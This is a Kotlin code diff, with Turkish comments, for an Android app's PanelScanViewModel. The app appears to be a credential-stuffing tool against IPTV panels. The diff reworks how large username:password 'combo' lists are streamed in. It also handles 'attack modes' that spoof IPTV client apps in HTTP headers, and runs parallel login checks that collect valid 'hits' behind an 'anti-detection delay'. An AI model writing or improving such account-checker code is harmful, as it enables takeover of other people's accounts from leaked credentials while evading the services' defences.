@@ -2,16 +2,20 @@ package com.alibaba.feature.panelscan
 
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
-import com.alibaba.data.service.PanelScannerImpl
 import com.alibaba.domain.model.*
 import com.alibaba.domain.service.PanelScanner
 import dagger.hilt.android.lifecycle.HiltViewModel
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.async
+import kotlinx.coroutines.awaitAll
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.update
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.sync.Semaphore
+import kotlinx.coroutines.sync.withPermit
 import kotlinx.coroutines.withContext
 import java.io.InputStream
 import javax.inject.Inject
@@ -86,10 +90,6 @@ class PanelScanViewModel @Inject constructor(
     val state: StateFlow<PanelScanState> = _state.asStateFlow()
     
     private var scanJob: kotlinx.coroutines.Job? = null
-    
-    // PanelScannerImpl'e cast - gelişmiş özellikler için
-    private val advancedScanner: PanelScannerImpl? 
-        get() = panelScanner as? PanelScannerImpl
 
     fun setComboText(text: String) {
         val lineCount = text.lines().count { it.contains(":") }
@@ -98,36 +98,40 @@ class PanelScanViewModel @Inject constructor(
     
     /**
      * 🔥 Streaming combo yükleme - 1GB+ dosya desteği
+     * Büyük dosyaları satır satır okur, bellek taşmasını önler
      */
     fun loadComboFromStream(inputStream: InputStream, onComplete: (Int) -> Unit = {}) {
-        viewModelScope.launch {
+        viewModelScope.launch(Dispatchers.IO) {
             try {
                 _state.update { it.copy(errorMessage = null) }
                 
-                val scanner = advancedScanner
-                if (scanner != null) {
-                    val accounts = scanner.parseComboStream(
-                        inputStream = inputStream,
-                        onProgress = { lineCount ->
-                            _state.update { it.copy(comboLineCount = lineCount) }
+                val accounts = mutableListOf<String>()
+                var lineCount = 0
+                
+                inputStream.bufferedReader().useLines { lines ->
+                    lines.forEach { line ->
+                        val trimmed = line.trim()
+                        if (trimmed.contains(":") && !trimmed.startsWith("#")) {
+                            accounts.add(trimmed)
+                            lineCount++
+                            
+                            // Her 10000 satırda bir progress güncelle
+                            if (lineCount % 10000 == 0) {
+                                _state.update { it.copy(comboLineCount = lineCount) }
+                            }
                         }
-                    )
-                    
-                    // Hesapları text olarak sakla (geriye uyumluluk için)
-                    val comboText = accounts.joinToString("\n") { "${it.username}:${it.password}" }
-                    _state.update { 
-                        it.copy(
-                            comboText = comboText,
-                            comboLineCount = accounts.size
-                        ) 
                     }
-                    onComplete(accounts.size)
-                } else {
-                    // Fallback - normal okuma
-                    val text = inputStream.bufferedReader().use { it.readText() }
-                    setComboText(text)
-                    onComplete(_state.value.comboLineCount)
                 }
+                
+                val comboText = accounts.joinToString("\n")
+                _state.update { 
+                    it.copy(
+                        comboText = comboText,
+                        comboLineCount = accounts.size
+                    ) 
+                }
+                onComplete(accounts.size)
+                
             } catch (e: Exception) {
                 _state.update { it.copy(errorMessage = "Dosya okuma hatası: ${e.message}") }
             }
@@ -136,25 +140,10 @@ class PanelScanViewModel @Inject constructor(
     
     /**
      * Attack modu değiştir
+     * Seçilen mod tarama sırasında HTTP headers'a yansır
      */
     fun setAttackMode(mode: AttackModeOption) {
         _state.update { it.copy(attackMode = mode) }
-        
-        // Scanner'a da bildir
-        advancedScanner?.setAttackMode(
-            when (mode) {
-                AttackModeOption.ROTATION -> PanelScannerImpl.AttackMode.ROTATION
-                AttackModeOption.RANDOM -> PanelScannerImpl.AttackMode.RANDOM
-                AttackModeOption.TIVIMATE -> PanelScannerImpl.AttackMode.TIVIMATE
-                AttackModeOption.OTT_NAVIGATOR -> PanelScannerImpl.AttackMode.OTT_NAVIGATOR
-                AttackModeOption.KODI -> PanelScannerImpl.AttackMode.KODI
-                AttackModeOption.XCIPTV -> PanelScannerImpl.AttackMode.XCIPTV
-                AttackModeOption.STB_MAG -> PanelScannerImpl.AttackMode.STB_MAG
-                AttackModeOption.SMARTERS_PRO -> PanelScannerImpl.AttackMode.SMARTERS_PRO
-                AttackModeOption.APPLE_TV -> PanelScannerImpl.AttackMode.APPLE_TV
-                AttackModeOption.CLOUDBURST -> PanelScannerImpl.AttackMode.CLOUDBURST
-            }
-        )
     }
     
     /**
@@ -332,7 +321,7 @@ class PanelScanViewModel @Inject constructor(
 
                 // 🔥 PARALEL TARAMA - Çok daha hızlı
                 withContext(Dispatchers.IO) {
-                    val semaphore = kotlinx.coroutines.sync.Semaphore(currentState.scanSpeed.concurrency)
+                    val semaphore = Semaphore(currentState.scanSpeed.concurrency)
                     var currentScan = 0
                     
                     val jobs = accounts.flatMap { account ->
@@ -350,7 +339,7 @@ class PanelScanViewModel @Inject constructor(
                                                     validCount++
                                                     results.add(result)
                                                     // Hit bulunduğunda hemen UI'ı güncelle
-                                                    _state.update { it.copy(results = results.toList()) }
+                                                    _state.update { s -> s.copy(results = results.toList()) }
                                                 }
                                                 is ScanStatus.Invalid -> invalidCount++
                                                 is ScanStatus.Error -> errorCount++
@@ -363,8 +352,8 @@ class PanelScanViewModel @Inject constructor(
                                                 val elapsed = (System.currentTimeMillis() - startTime) / 1000f
                                                 val speed = if (elapsed > 0) currentScan / elapsed else 0f
                                                 
-                                                _state.update { 
-                                                    it.copy(
+                                                _state.update { s -> 
+                                                    s.copy(
                                                         progress = ScanProgress(
                                                             current = currentScan,
                                                             total = totalScans,
@@ -382,7 +371,7 @@ class PanelScanViewModel @Inject constructor(
                                         
                                         // Anti-detection delay
                                         if (delayMs > 0) {
-                                            kotlinx.coroutines.delay(delayMs)
+                                            delay(delayMs)
                                         }
                                         
                                         result
